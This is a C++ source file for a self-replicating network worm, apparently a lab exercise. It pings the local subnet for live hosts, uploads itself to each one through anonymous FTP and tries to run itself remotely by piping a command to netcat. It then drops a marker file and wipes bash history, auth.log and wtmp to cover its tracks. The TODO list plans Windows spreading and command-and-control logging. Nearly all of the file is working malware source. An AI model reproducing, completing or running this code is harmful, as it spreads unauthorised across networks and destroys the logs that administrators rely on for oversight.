// === Self-Replicating Worm ===
// Sends pings to all hosts in the subnet and listens for replies to detect active devices.
// Starting from first target, connect via FTP, then copy the worm to target.
// Remote execute worm from target machine.
//
// TODO:
// - Apply multithreading to speed up subnet scan for targets.
// - Fix remote netcat execution (currently non-permission to launch executable, or tar a worm.tar file).
// - Change from "ens35" hard-corded interface name to scan and select available interface.
// - Utilize PowerShell commands if target OS is WIN32.
// - Remove connection loop to first target, move on to second target.
// - Add Command & Control (C2) logging on original host for all subsequent target-hosts.
// - Among other things...

#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <cstdlib>          // for system()
#include <unistd.h>         // for gethostname()
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <cstring>
#include <sys/socket.h>
#include <net/if_arp.h>
#include <linux/if_ether.h>
#include <thread>
#include <mutex>

struct DiscoveredHost {
    std::string ipAddress;
    std::string macAddress;
};

// === SECTION 1: Network Discovery ===
// Discover hosts on local network using ping
class NetworkDiscoverModule {

    private:
    std::string getLocalIPAddress(const std::string& interfaceName) {
        struct ifaddrs* ifAddrStruct = nullptr;
        getifaddrs(&ifAddrStruct);

        std::string ipAddress = "";

        for (struct ifaddrs* ifa = ifAddrStruct; ifa != nullptr; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr == nullptr) {
                continue;
            }
            if (ifa->ifa_addr->sa_family == AF_INET && interfaceName == ifa->ifa_name) {
                void* tmpAddrPtr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
                char addressBuffer[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
                ipAddress = addressBuffer;
                break;
            }
        }

        if (ifAddrStruct != nullptr) {
            freeifaddrs(ifAddrStruct);
        }

        return ipAddress;
    }

    public:
    std::vector<DiscoveredHost> discoverLiveHosts() {
        std::vector<DiscoveredHost> liveHosts;
        std::mutex hostMutex; // Protects liveHosts

        std::string interfaceName = "ens35";                         // Update to match VM network interface
        std::string localIP = getLocalIPAddress(interfaceName);
        if (localIP.empty()) {
            std::cerr << "[!] Could not determine local IP address." << std::endl;
            return liveHosts;
        }

        std::cout << "[*] Scanning subnet for live hosts from base IP: " << localIP << std::endl;
        std::string baseIP = localIP.substr(0, localIP.find_last_of('.'));

        for (int i = 1; i < 255; ++i) {
            std::string targetIP = baseIP + "." + std::to_string(i);
            std::string pingCommand = "ping -c 1 -W 1 " + targetIP + " > /dev/null 2>&1";
            int result = system(pingCommand.c_str());
            if (result == 0) {
                DiscoveredHost host;
                host.ipAddress = targetIP;
                host.macAddress = "??:??:??:??:??:??"; // Placeholder
                liveHosts.push_back(host);
                std::cout << "[+] Host found: " << targetIP << std::endl;
            }
            std::cout << "Scanning " << targetIP << std::endl;
        }

        return liveHosts;
    }
};

// === SECTION 2: Exploit FTP connection ===
class FtpExploitModule {

    private:
    std::string ftpScriptPath = "/tmp/ftp_upload_script.txt";
    std::string remoteWormPath = "worm"; // Relative to FTP session
    std::string remoteWormFullPath = "/home/ftp/worm";

    void createFtpScript(const std::string& targetIP, const std::string& localWormFileName) {
        std::ofstream scriptFile(ftpScriptPath);
        scriptFile << "open " << targetIP << std::endl;
        scriptFile << "user anonymous" << std::endl;
        scriptFile << "put " << localWormFileName << std::endl;
        scriptFile << "bye" << std::endl;
        scriptFile.close();
    }
    
    public:
    bool attemptFtpAnonymousLoginAndUpload(const std::string& targetIP, const std::string& localWormFileName) {
        std::cout << "[*] Attempting FTP exploit on " << targetIP << std::endl;
        createFtpScript(targetIP, localWormFileName);

        std::string ftpCommand = "ftp -n < " + ftpScriptPath + " > /dev/null 2>&1";
        int result = system(ftpCommand.c_str());

        if (result == 0) {
            std::cout << "[+] FTP upload succeeded to " << targetIP << std::endl;
            return true;
        } else {
            std::cout << "[-] FTP upload failed to " << targetIP << std::endl;
            return false;
        }
    }

    bool remotelyExecuteWormViaNetCat(const std::string& targetIP) {
        std::string execCmd = "echo \"chmod 777 " + remoteWormFullPath + " && " + remoteWormFullPath + "\" | nc " + targetIP + " 4444";
        std::cout << "[*] Attempting remote execution via netcat: " << targetIP << std::endl;
        return system(execCmd.c_str()) == 0;
    }
};

// === SECTION 3: Payload ===
class PayloadModule {
    
    public:
    void dropSuccessFile() {
        std::ofstream outputFile("/tmp/SUCCESS.txt");
        outputFile << "Success marker dropped by worm." << std::endl;
        outputFile.close();
        std::cout << "[*] Dropped SUCCESS.txt" << std::endl;
    }
};

// === SECTION 4: Cover your tracks ===
class LogCleanupModule {

    public:
    void eraseLogs() {
        std::cout << "[*] Attempting to clean logs..." << std::endl;
        system("truncate -s 0 ~/.bash_history 2>/dev/null");
        system("truncate -s 0 /var/log/auth.log 2>/dev/null");
        system("truncate -s 0 /var/log/wtmp 2>/dev/null");
    }
};

// === SECTION 5: Main Orchestration class ===
class Worm {

    private:
    NetworkDiscoverModule networkDiscovery;
    FtpExploitModule ftpExploit;
    PayloadModule payload;
    LogCleanupModule logCleanup;
    std::string localWormFileName = "worm";

    public:
    void run() {
        std::vector<DiscoveredHost> discoveredHosts = networkDiscovery.discoverLiveHosts();        
        
        for (int i = 0; i < discoveredHosts.size(); ++i) {
            DiscoveredHost host = discoveredHosts[1];

            std::cout << "[*] Attempting to exploit host: " << host.ipAddress << std::endl;

            bool uploadSuccess = ftpExploit.attemptFtpAnonymousLoginAndUpload(host.ipAddress, localWormFileName);
            if (uploadSuccess == true) {
                bool executionSuccess = ftpExploit.remotelyExecuteWormViaNetCat(host.ipAddress);
                if (executionSuccess == true) {
                    std::cout << "[+] Worm executed remotely on: " << host.ipAddress << std::endl;
                } else {
                    std::cout << "[-] Remote execution failed on: " << host.ipAddress << std::endl;
                }

                payload.dropSuccessFile();
                logCleanup.eraseLogs();
            } else {
                std::cout << "[-] FTP upload failed on: " << host.ipAddress << std::endl;
            }
        }
    }
};

// === SECTION 6: Program Entry ===
int main() {

    Worm worm;
    worm.run();

    return 0;
}
